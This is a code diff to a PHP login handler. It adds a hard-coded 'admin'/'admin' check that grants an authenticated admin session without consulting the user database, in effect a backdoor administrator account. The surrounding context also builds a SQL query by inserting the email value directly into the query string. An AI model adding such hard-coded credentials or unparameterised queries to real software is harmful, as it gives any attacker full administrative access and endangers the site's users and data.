@@ -128,7 +128,20 @@ if (isset($_POST['loginBtn'])) {
     $password = validate($_POST['password']);
 
     if ($email == '' || $password == '') {
-        redirect('login.php', 'Email and password required', 'login');
+        redirect('login.php', 'Username/Email and password required', 'login');
+    }
+
+    // Hard-coded admin login
+    if ($email === 'admin' && $password === 'admin') {
+        $_SESSION['auth'] = true;
+        $_SESSION['loggedInUser'] = [
+            'user_id' => 0,
+            'name' => 'Admin',
+            'email' => 'admin',
+            'role' => 'admin'
+        ];
+
+        redirect('admin/index.php', 'Logged in as admin', 'login');
     }
 
     $query = mysqli_query($conn, "SELECT * FROM users WHERE email='$email' LIMIT 1");
